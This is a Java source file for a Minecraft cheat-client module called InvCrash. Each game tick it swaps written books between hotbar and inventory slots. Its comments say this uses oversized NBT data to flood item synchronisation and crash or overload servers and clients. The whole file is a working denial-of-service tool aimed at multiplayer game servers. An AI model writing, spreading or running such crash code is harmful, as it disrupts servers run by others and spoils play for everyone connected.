package nekiplay.meteorplus.features.modules.misc;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.screen.slot.SlotActionType;

/**
 * 每个指定延迟的游戏刻 (Tick) 将热栏 (0–8) 与背包槽位 (9–17) 中的所有写满书 (WRITTEN_BOOK) 交换一次，
 * 利用超大 NBT 数据不断触发服务端和客户端的物品同步，从而造成极强的 NBT Flood 效果。
 */
public class InvCrash extends Module {
	private final SettingGroup sgGeneral = settings.getDefaultGroup();

	private final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
		.name("delay")
		.description("Delay in ticks between each crash swap cycle.")
		.defaultValue(1)
		.min(1)
		.sliderRange(1, 20)
		.build()
	);

	private int tickCounter = 0;

	public InvCrash() {
		super(Categories.Misc, "inv-crash", "Delayed swapping every written_book slots to cause NBT flood.");
	}

	@EventHandler
	private void onTick(TickEvent.Post event) {
		if (++tickCounter < delay.get()) return;
		tickCounter = 0;

		ClientPlayerEntity player = mc.player;
		if (player == null || mc.interactionManager == null) return;

		// 遍历背包槽 9–17 与热栏槽 0–8 一一对应地交换
		for (int hotbar = 0; hotbar <= 8; hotbar++) {
			int invSlot = 9 + hotbar;
			swapSlots(player, invSlot, hotbar);
			swapSlots(player, hotbar, invSlot);
		}
	}

	private void swapSlots(ClientPlayerEntity player, int from, int to) {
		ItemStack stack = player.getInventory().getStack(from);
		// 仅对写满书触发
		if (stack.getItem() != Items.WRITTEN_BOOK) return;

		// 使用 InteractionManager 提供的方法构造并发送 ClickSlot 包，避免类型不匹配
		mc.interactionManager.clickSlot(
			player.currentScreenHandler.syncId,
			from,
			to,
			SlotActionType.SWAP,
			player
		);
	}

	@Override
	public void onDeactivate() {
		// 无需清理
	}
}
